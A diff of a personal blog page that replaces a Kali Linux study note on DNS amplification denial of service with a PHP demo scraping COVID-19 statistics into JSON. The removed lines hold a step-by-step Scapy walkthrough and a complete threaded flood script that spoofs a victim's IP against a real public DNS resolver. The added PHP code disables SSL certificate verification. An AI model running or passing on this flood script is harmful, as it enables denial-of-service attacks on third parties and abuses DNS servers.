@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="安全," />
+  <meta name="keywords" content="PHP基础," />
 
 
 
@@ -79,18 +79,16 @@
 
 
 
-<meta name="description" content="1. DNS放大攻击 产生大流量的攻击方法 单机的带宽优势 巨大单机数量形成的流量汇聚 利用协议特性实现放大效果的流量   DNS协议放大效果 查询请求流量小，但响应流量可能非常巨大 🔺命令：dig hp.com @202.96.134.133（流量放大约8倍）   攻击原理 伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询 DNS服务器成为流量放大和实施攻击者，大量DNS服务器实现D">
-<meta name="keywords" content="安全">
+<meta name="description" content="代码介绍  ▲ 本代码是通过GET请求，抓取丁香园疫情数据，对丁香园疫情数据的分析，进行正则匹配筛选，最后封装成json文件 ▲ 2020.03.16 本代码目前只能对中国地区的数据抓取，其他地区的数据类同，待修改 ▲ 2020.03.16 本代码中间对字符串的处理不具有通用性，待修改 ▲ 2020.03.16 本代码未实现写入数据库的功能，但不难，待修改 包含的内容 php的curl库的数据">
+<meta name="keywords" content="PHP基础">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux笔记(八十三)：DoS--DNS放大">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;09&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%89)%EF%BC%9ADoS--DNS%E6%94%BE%E5%A4%A7&#x2F;index.html">
+<meta property="og:title" content="PHP实战-1：2019年新冠状病毒数据的抓取Demo">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;03&#x2F;16&#x2F;PHP%E5%AE%9E%E6%88%98-1%EF%BC%9A2019%E5%B9%B4%E6%96%B0%E5%86%A0%E7%8A%B6%E7%97%85%E6%AF%92%E6%95%B0%E6%8D%AE%E7%9A%84%E6%8A%93%E5%8F%96Demo&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="1. DNS放大攻击 产生大流量的攻击方法 单机的带宽优势 巨大单机数量形成的流量汇聚 利用协议特性实现放大效果的流量   DNS协议放大效果 查询请求流量小，但响应流量可能非常巨大 🔺命令：dig hp.com @202.96.134.133（流量放大约8倍）   攻击原理 伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询 DNS服务器成为流量放大和实施攻击者，大量DNS服务器实现D">
+<meta property="og:description" content="代码介绍  ▲ 本代码是通过GET请求，抓取丁香园疫情数据，对丁香园疫情数据的分析，进行正则匹配筛选，最后封装成json文件 ▲ 2020.03.16 本代码目前只能对中国地区的数据抓取，其他地区的数据类同，待修改 ▲ 2020.03.16 本代码中间对字符串的处理不具有通用性，待修改 ▲ 2020.03.16 本代码未实现写入数据库的功能，但不难，待修改 包含的内容 php的curl库的数据">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=1503nDLGqXjIwmENcYCXt4Hkr5EAHJ9BLqjW16FyV1IYRnOO9gMW-0cVSvDhjyIdj_lTF19VL0yhWg7vnX-l0r-w6pYB6smOI_-nfpJc0ibm1xUZRlvb_2F6TgSdoCJn&amp;file_name=&#x2F;DNS%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB.PNG">
-<meta property="og:updated_time" content="2020-02-10T13:15:49.262Z">
+<meta property="og:updated_time" content="2020-03-16T07:50:47.239Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=1503nDLGqXjIwmENcYCXt4Hkr5EAHJ9BLqjW16FyV1IYRnOO9gMW-0cVSvDhjyIdj_lTF19VL0yhWg7vnX-l0r-w6pYB6smOI_-nfpJc0ibm1xUZRlvb_2F6TgSdoCJn&amp;file_name=&#x2F;DNS%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB.PNG">
 
 
 
@@ -120,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/02/09/Kali Linux笔记(八十三)：DoS--DNS放大/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/03/16/PHP实战-1：2019年新冠状病毒数据的抓取Demo/"/>
 
 
 
 
 
-  <title>Kali Linux笔记(八十三)：DoS--DNS放大 | Tomas'Blog</title>
+  <title>PHP实战-1：2019年新冠状病毒数据的抓取Demo | Tomas'Blog</title>
   
 
 
@@ -245,7 +243,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%89)%EF%BC%9ADoS--DNS%E6%94%BE%E5%A4%A7/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/16/PHP%E5%AE%9E%E6%88%98-1%EF%BC%9A2019%E5%B9%B4%E6%96%B0%E5%86%A0%E7%8A%B6%E7%97%85%E6%AF%92%E6%95%B0%E6%8D%AE%E7%9A%84%E6%8A%93%E5%8F%96Demo/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Tomas">
@@ -262,7 +260,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(八十三)：DoS--DNS放大</h1>
+          <h1 class="post-title" itemprop="name headline">PHP实战-1：2019年新冠状病毒数据的抓取Demo</h1>
         
 
         <div class="post-meta">
@@ -274,8 +272,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T23:49:58+08:00">
-                2020-02-09
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-16T15:52:00+08:00">
+                2020-03-16
               </time>
             
 
@@ -297,8 +295,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
+                  <a href="/categories/PHP/" itemprop="url" rel="index">
+                    <span itemprop="name">PHP</span>
                   </a>
                 </span>
 
@@ -328,7 +326,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  488 字
+                  685 字
                 </span>
               
 
@@ -366,71 +364,35 @@
 
       
         <hr>
-<h4 id="1-DNS放大攻击"><a href="#1-DNS放大攻击" class="headerlink" title="1. DNS放大攻击"></a>1. DNS放大攻击</h4><ul>
-<li>产生大流量的攻击方法<ul>
-<li>单机的带宽优势</li>
-<li>巨大单机数量形成的流量汇聚</li>
-<li>利用协议特性实现放大效果的流量</li>
+<ol>
+<li><p>代码介绍</p>
+<ul>
+<li>▲ 本代码是通过GET请求，抓取丁香园疫情数据，对丁香园疫情数据的分析，进行正则匹配筛选，最后封装成json文件</li>
+<li>▲ 2020.03.16 本代码目前只能对中国地区的数据抓取，其他地区的数据类同，待修改</li>
+<li>▲ 2020.03.16 本代码中间对字符串的处理不具有通用性，待修改</li>
+<li>▲ 2020.03.16 本代码未实现写入数据库的功能，但不难，待修改</li>
+<li>包含的内容<ul>
+<li>php的curl库的数据抓取</li>
+<li>正则表达式的简单使用</li>
+<li>字符串的多重处理</li>
+<li>json数据的形式</li>
 </ul>
 </li>
-<li>DNS协议放大效果<ul>
-<li>查询请求流量小，但响应流量可能非常巨大</li>
-<li><strong><code>🔺命令：dig hp.com @202.96.134.133</code></strong>（流量放大约8倍）</li>
+<li>过程中踩的坑<ul>
+<li>curl抓取页面，因为是<code>&lt;scipt&gt;</code>标签内的形式，所以html页面只显示404，需要通过查看页面源代码的方式去查询到数据</li>
+<li>正则表达式的写法，中文字符目前还无法匹配</li>
+<li>字符串与数组的互相转换</li>
+<li>“”在写出json文件时，会出现转义字符/</li>
+<li>将数组写进文件，不能通过fwrite()函数的形式，需要通过file_put_contents()函数</li>
+<li>json_encode有多种表示参数，在第二个参数options中可进行设置</li>
+<li>var_dump()函数是个好东西，可以通过这个进行输出</li>
 </ul>
 </li>
-<li>攻击原理<ul>
-<li>伪造源地址为被攻击目标地址，向递归域名查询服务器发起查询</li>
-<li>DNS服务器成为流量放大和实施攻击者，大量DNS服务器实现DDoS</li>
 </ul>
 </li>
-</ul>
-<h4 id="2-Scapy构造攻击数据包"><a href="#2-Scapy构造攻击数据包" class="headerlink" title="2. Scapy构造攻击数据包"></a>2. Scapy构造攻击数据包</h4><ul>
-<li>Kali开启Wireshark抓包，监听Kali的IP地址</li>
-<li>IP/UDP/DNS/DNS查询内容</li>
-<li>IP头构造<ul>
-<li>i=IP()</li>
-<li>i.dst=”202.96.134.133”</li>
-<li>i.src=”被攻击者的IP”</li>
-<li>i.display()</li>
-</ul>
-</li>
-<li>UDP头构造<ul>
-<li>u=udp()</li>
-<li>u.display()</li>
-</ul>
-</li>
-<li>DNS头构造<ul>
-<li>d=DNS()</li>
-<li>d.rd=1（递归查询）</li>
-<li>d.qdount=1</li>
-<li>d.display()</li>
-</ul>
-</li>
-<li>DNS内容构造<ul>
-<li>q=DNSQR()</li>
-<li>q.qname=”hp.com”</li>
-<li>q.qtype=255（A为默认记录，255即查所有记录）</li>
-<li>q.display()</li>
-</ul>
-</li>
-<li>拼接数据<ul>
-<li>d.qd=q</li>
-<li>d.display()</li>
-</ul>
-</li>
-<li>发送数据包<ul>
-<li>r=(i/u/d)</li>
-<li>r.display()</li>
-<li>sr1(r)</li>
-<li>▲ 发包：send(r)（可用Kali进行发包，物理机进行接收数据包）</li>
-</ul>
-</li>
-<li>▲ 结合IP地址欺骗，利用大量DNS服务器做傀儡攻击目标</li>
-<li><strong><code>🔺命令：./dns_flood.py 被攻击者的IP hp.com 20</code></strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line">import random</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 4:</span><br><span class="line">    print &quot;用法：./dns_flood.py [IP地址] [利用的域名] [线程数]&quot;</span><br><span class="line">    print &quot;举例：./dns_flood.py 1.1.1.1 hp.com 20&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">dnsname = str(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">print &quot;正在执行 DNS Flood 攻击，按 Ctrl+C 停止攻击&quot;</span><br><span class="line">def dnsflood(target,dnsname):</span><br><span class="line">    while 0 == 0:</span><br><span class="line">        x = random.randint(0,65535)</span><br><span class="line">        send(IP(dst=&quot;202.96.134.133&quot;,src=target)/UDP(sport=x,dport=53)/DNS(rd=1,qdcount=1,qd=DNSQR(qname=dnsname,qtype=255)),verbose=0)</span><br><span class="line"></span><br><span class="line">for x in range(0,threads):</span><br><span class="line">    thread.start_new_thread(dnsflood,(target,dnsname))</span><br><span class="line"></span><br><span class="line">while 0 == 0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    header(&apos;Content-type:text/html;charset=utf-8&apos;);  //文件编码形式</span><br><span class="line">    $header = array();  //头部形式</span><br><span class="line">    $header[] = &apos;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;;</span><br><span class="line">    $header[] = &apos;Cache-Control: no-cache&apos;;</span><br><span class="line">    $header[] = &apos;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0&apos;;</span><br><span class="line">    $url = &apos;https://ncov.dxy.cn/ncovh5/view/pneumonia&apos;;  //要抓取的url</span><br><span class="line">    $ch = curl_init();  //curl初始化</span><br><span class="line">    $timeout = 5;  //超时时间</span><br><span class="line">    curl_setopt ($ch, CURLOPT_URL, $url);  //设置url</span><br><span class="line">    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);  //设置显示还是写入字符串，1为显示</span><br><span class="line">    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);  //设置超时时间</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);  //关闭SSL点对点验证</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);  //关闭SSL端对端验证</span><br><span class="line">    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);  //设置请求头</span><br><span class="line">    //curl_setopt($ch,　CURLOPT_PROXYTYPE,CURLPROXY_SOCKS5);  //设置代理方式</span><br><span class="line">    //curl_setopt($ch, CURLOPT_PROXY, &quot;127.0.0.1:1080&quot;);  //设置代理的服务器</span><br><span class="line">    $file_contents = curl_exec($ch);  //发生curl请求</span><br><span class="line">    curl_close($ch);  //关闭curl请求</span><br><span class="line">    //$file_contents = json_decode($file_contents);  //json解码</span><br><span class="line">    //mb_convert_encoding($file_contents,&apos;utf-8&apos;);  //转换字符编码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //$f = fopen(&quot;./1.html&quot;, &quot;a+&quot;);  //打开文件，模式为可读可写</span><br><span class="line">    //Fwrite($f,$file_contents);//写入文件</span><br><span class="line"></span><br><span class="line">    $pattern = &apos;/&#123;&quot;cityName&quot;:&quot;.&#123;2,20&#125;,.&#123;2,120&#125;&#125;/&apos;;  //正则表达式</span><br><span class="line">    preg_match_all($pattern,$file_contents,$match);  //匹配正则表达式</span><br><span class="line"></span><br><span class="line">    $change = $match[0];  //转换为字符串</span><br><span class="line">    $change = implode(&apos;;&apos;, $change);  //添加分隔符;</span><br><span class="line">    $change = str_replace(&apos;&quot;&apos;,&quot;&quot;,$change);  //去掉符号&quot;</span><br><span class="line">    $change = explode(&apos;;&apos;, $change);  //通过分隔符;合并</span><br><span class="line">    var_dump($change);  </span><br><span class="line"></span><br><span class="line">    $b = json_encode($change,JSON_UNESCAPED_UNICODE);  //json编码形式</span><br><span class="line">    var_dump($b);</span><br><span class="line"></span><br><span class="line">    file_put_contents(&apos;./index.json&apos;,$b);  //写入index.json文件</span><br><span class="line"></span><br><span class="line">    //Fclose($f);  //关闭文件</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=1503nDLGqXjIwmENcYCXt4Hkr5EAHJ9BLqjW16FyV1IYRnOO9gMW-0cVSvDhjyIdj_lTF19VL0yhWg7vnX-l0r-w6pYB6smOI_-nfpJc0ibm1xUZRlvb_2F6TgSdoCJn&file_name=/DNS%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB.PNG" alt="DNS放大攻击"></p>
 
       
     </div>
@@ -448,7 +410,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+            <a href="/tags/PHP%E5%9F%BA%E7%A1%80/" rel="tag"># PHP基础</a>
           
         </div>
       
@@ -461,8 +423,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%BA%8C)%EF%BC%9ATearDrop/" rel="next" title="Kali Linux笔记(八十二)：TearDrop">
-                <i class="fa fa-chevron-left"></i> Kali Linux笔记(八十二)：TearDrop
+              <a href="/2020/03/13/PHP%E7%AC%94%E8%AE%B0-21%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8EPHP%E6%93%8D%E4%BD%9C/" rel="next" title="PHP笔记-21：数据库与PHP操作">
+                <i class="fa fa-chevron-left"></i> PHP笔记-21：数据库与PHP操作
               </a>
             
           </div>
@@ -470,10 +432,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/02/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E5%9B%9B)%EF%BC%9ADoS--SNMP%E6%94%BE%E5%A4%A7/" rel="prev" title="Kali Linux笔记(八十四)：DoS--SNMP放大">
-                Kali Linux笔记(八十四)：DoS--SNMP放大 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -525,17 +483,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -633,22 +582,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-DNS放大攻击"><span class="nav-number">1.</span> <span class="nav-text">1. DNS放大攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Scapy构造攻击数据包"><span class="nav-number">2.</span> <span class="nav-text">2. Scapy构造攻击数据包</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
